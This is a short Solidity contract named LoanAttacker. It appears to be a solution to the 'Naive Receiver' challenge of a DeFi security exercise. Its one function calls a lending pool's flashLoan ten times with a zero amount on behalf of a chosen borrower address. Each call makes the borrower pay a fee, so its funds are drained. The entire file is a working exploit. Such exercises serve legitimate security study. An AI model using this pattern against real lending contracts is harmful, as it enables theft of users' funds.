// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface INaiveReceiverLenderPool {
    function flashLoan(address, uint256) external;
}

contract LoanAttacker {
    function attack(address poolAddress, address borrowerAddress) public {
        for (uint i=0; i < 10; i++) {
            INaiveReceiverLenderPool(poolAddress).flashLoan(borrowerAddress, 0);
        }
    }
}